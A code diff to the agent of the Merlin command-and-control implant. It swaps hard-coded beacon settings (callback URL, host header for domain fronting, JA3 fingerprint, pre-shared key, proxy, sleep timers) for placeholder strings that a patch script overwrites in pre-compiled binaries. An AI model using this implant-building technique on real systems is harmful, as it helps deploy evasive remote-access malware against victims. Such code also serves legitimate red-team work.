@@ -114,7 +114,7 @@ type Agent struct {
 	Host               string          // HTTP Host header, typically used with Domain Fronting
 	pwdU               []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
 	psk                string          // Pre-Shared Key
-	JA3                string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
+	JA3                string          // JA3 signature (not the MD5 hash) used to generate a JA3 client
 	BatchCommands      bool            // Run all available commands each checkin (vs. one per checkin)
 }
 
@@ -123,29 +123,87 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 	if debug {
 		message("debug", "Entering agent.New function")
 	}
+
+	//Dance required so gandalf_generate.py patch script can replace these values in a pre-compiled binary
+
+	//18 digit max
+	StrWaitTimeMin := "999999999999999999"
+	IntWaitTimeMin, _ := strconv.ParseInt(StrWaitTimeMin, 10, 64)
+
+	//18 digit max
+	StrWaitTimeMax := "888888888888888888"
+	IntWaitTimeMax, _ := strconv.ParseInt(StrWaitTimeMax, 10, 64)
+
+	//18 digit max
+	StrInactiveMultiplier := "777777777777777777"
+	IntInactiveMultiplier, _ := strconv.ParseInt(StrInactiveMultiplier, 10, 64)
+
+	//18 digit max
+	StrInactiveThreshold := "666666666666666666"
+	IntInactiveThreshold, _ := strconv.Atoi(StrInactiveThreshold)
+
+	//18 digit max
+	StrMaxRetry := "555555555555555555"
+	IntMaxRetry, _ := strconv.Atoi(StrMaxRetry)
+
+	//18 digit max
+	StrPaddingMax := "444444444444444444"
+	IntPaddingMax, _ := strconv.Atoi(StrPaddingMax)
+
+	//18 digit max
+	StrKillDate := "000000000000000000"
+	IntKillDate, _ := strconv.ParseInt(StrKillDate, 10, 64)
+
+	//200 character max
+	StrUserAgentPre := "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
+	StrUserAgentPost := strings.Trim(StrUserAgentPre, " ")
+
+	//200 character max
+	StrURLPre := "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"
+	StrURLPost := strings.Trim(StrURLPre, " ")
+
+	StrProtocolPre := "XXXXX"
+	StrProtocolPost := strings.Trim(StrProtocolPre, " ")
+
+	//200 character max
+	StrPSKPre := "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW"
+	StrPSKPost := strings.Trim(StrPSKPre, " ")
+
+	//200 character max
+	StrProxyPre := "VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV"
+	StrProxyPost := strings.Trim(StrProxyPre, " ")
+
+	//200 character max
+	StrJA3Pre := "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU"
+	StrJA3Post := strings.Trim(StrJA3Pre, " ")
+
+	//200 character max
+	StrHostHeaderPre := "TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT"
+	StrHostHeaderPost := strings.Trim(StrHostHeaderPre, " ")
+
 	a := Agent{
 		ID:                 uuid.NewV4(),
 		Platform:           runtime.GOOS,
 		Architecture:       runtime.GOARCH,
 		Pid:                os.Getpid(),
 		Version:            merlin.Version,
-		WaitTimeMin:        15,
-		ActiveMin:          15, //This should match WaitTimeMin
-		WaitTimeMax:        30,
-		ActiveMax:          30, //This should match WaitTimeMax
-		PaddingMax:         4096,
-		MaxRetry:           99999,
-		InactiveMultiplier: 5,
-		InactiveThreshold:  6,
+		WaitTimeMin:        IntWaitTimeMin,
+		ActiveMin:          IntWaitTimeMin,
+		WaitTimeMax:        IntWaitTimeMax,
+		ActiveMax:          IntWaitTimeMax,
+		PaddingMax:         IntPaddingMax,
+		MaxRetry:           IntMaxRetry,
+		InactiveMultiplier: IntInactiveMultiplier,
+		InactiveThreshold:  IntInactiveThreshold,
 		Verbose:            verbose,
 		Debug:              debug,
-		Proto:              protocol,
-		UserAgent:          "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
+		Proto:              StrProtocolPost,
+		UserAgent:          StrUserAgentPost,
 		initial:            false,
-		KillDate:           0,
-		URL:                url,
-		Host:               host,
-		JA3:                ja3,
+		KillDate:           IntKillDate,
+		URL:                StrURLPost,
+		Host:               StrHostHeaderPost,
+		JA3:                StrJA3Post,
 		BatchCommands:      true,
 	}
 
@@ -189,7 +247,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 
 	var errClient error
 
-	a.Client, errClient = getClient(a.Proto, proxy, a.JA3)
+	a.Client, errClient = getClient(a.Proto, StrProxyPost, a.JA3)
 
 	if errClient != nil {
 		return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)
@@ -200,7 +258,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 	a.pwdU = pbkdf2.Key([]byte(x), a.ID.Bytes(), 5000, 32, sha256.New)
 
 	// Set encryption secret to pre-authentication pre-shared key
-	a.psk = psk
+	a.psk = StrPSKPost
 
 	// Generate RSA key pair
 	privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
